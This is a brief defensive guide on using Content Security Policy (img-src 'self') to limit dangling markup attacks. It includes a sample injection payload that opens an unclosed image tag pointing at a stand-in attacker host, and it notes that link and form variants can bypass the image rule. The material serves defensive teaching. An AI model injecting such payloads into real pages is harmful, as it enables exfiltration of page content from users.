# Mitigating Dangling Markup Using CSP

## Overview

Certain CSP directives can reduce the effectiveness of Dangling Markup attacks.

---

# Common Dangling Markup Payload

```html
"><img src='//attacker.com?
```

---

# Why It Works

Browser attempts to load:

```html
img
```

from attacker domain.

---

# Defensive CSP

```http
img-src 'self'
```

---

Meaning:

```text
Only Images From Same Origin Allowed
```

---

# Example

Allowed:

```html
<img src="/logo.png">
```

---

Blocked:

```html
<img src="https://evil.com/x">
```

---

# Limitation

CSP prevents:

```html
img
```

based exfiltration.

---

However:

```html
<a href=
<form action=
```

attacks may still work.

---

# Key Takeaways

- CSP can mitigate some dangling markup attacks.
- It does not completely eliminate the attack surface.